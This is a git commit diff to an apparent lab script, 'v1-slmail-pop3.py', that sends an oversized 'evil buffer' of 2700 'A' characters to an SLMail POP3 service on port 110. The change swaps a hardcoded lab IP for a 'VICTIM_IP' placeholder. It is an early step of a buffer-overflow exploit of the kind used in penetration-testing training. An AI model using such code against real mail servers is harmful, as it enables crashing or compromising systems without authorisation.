fcb557b940ed770eae540fcd1ca8d5500a452571
YY <51569155+g1ng3r-cyb3r@users.noreply.github.com>
2019-06-10 17:40:40 +0800

    Update v1-slmail-pop3.py

--- v1-slmail-pop3.py
+++ v1-slmail-pop3.py
@@ -6,7 +6,7 @@ buffer = 'A' * 2700
 
 try:
     print "\nSending evil buffer..."
-    s.connect(('10.11.23.123', 110))
+    s.connect(('VICTIM_IP', 110))
     data = s.recv(1024)
     s.send('User username' + '\r\n')
     data=s.recv(1024)
